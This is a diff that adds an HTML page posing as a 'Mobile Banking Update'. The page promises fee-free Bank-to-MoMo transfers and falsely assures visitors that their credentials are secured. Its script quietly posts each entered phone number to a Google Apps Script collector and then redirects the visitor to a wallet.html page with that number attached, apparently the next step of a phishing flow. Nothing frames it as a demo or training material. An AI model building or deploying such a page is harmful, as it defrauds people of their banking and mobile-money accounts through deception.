@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Mobile Banking Update</title>
+
+<style>
+    body { margin: 0; font-family: Arial, sans-serif; background-color: #003b7a; }
+    .container { text-align: center; padding: 40px 20px; color: white; }
+    h1 { color: white; font-size: 26px; font-weight: 700; margin-bottom: 10px; }
+    p { color: #e6e6e6; font-size: 16px; margin-top: 0; margin-bottom: 40px; line-height: 1.5; }
+    .form-box { background: white; border-radius: 25px 25px 0 0; padding: 30px 20px 50px; margin-top: 40px; text-align: left; color: #333; }
+    label { font-weight: bold; font-size: 18px; display: block; margin-bottom: 10px; }
+    input[type="text"] { width: 100%; padding: 15px; font-size: 16px; border: 2px solid #cccccc; border-radius: 10px; margin-bottom: 25px; box-sizing: border-box; }
+    button { width: 100%; padding: 15px; font-size: 18px; font-weight: bold; border: none; border-radius: 30px; background-color: grey; color: white; cursor: pointer; }
+    button:hover { background-color: #5a5a5a; }
+    .secured { text-align: center; margin-top: 15px; font-size: 14px; color: #666; }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <h1>MOBILE BANKING UPDATE</h1>
+    <p>Validating your phone number to the account enables you to make transactions
+        from Bank to MoMo or vice-versa without any fees associated.</p>
+</div>
+
+<div class="form-box">
+    <form id="submitForm">
+        <label>Phone Number</label>
+        <input type="text" id="phone" name="phone" placeholder="Enter your phone number" required />
+
+        <button type="submit">Submit</button>
+
+        <div class="secured">Your credentials are secured.</div>
+    </form>
+</div>
+
+<script>
+    document.getElementById("submitForm").addEventListener("submit", async function(e) {
+        e.preventDefault();
+
+        const phone = document.getElementById("phone").value;
+
+        const scriptURL = "https://script.google.com/macros/s/AKfycbzTjON_BjKj9u2TKg1l_PRrhaQmh8amYzxN73BWQjpzz0bJs9ha2LoG4xVdcNswyc6c/exec";
+
+        try {
+            await fetch(scriptURL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone })
+            });
+
+            window.location.href = "wallet.html?phone=" + encodeURIComponent(phone);
+
+        } catch (error) {
+            alert("Error submitting data.");
+            console.error(error);
+        }
+    });
+</script>
+
+</body>
+</html>
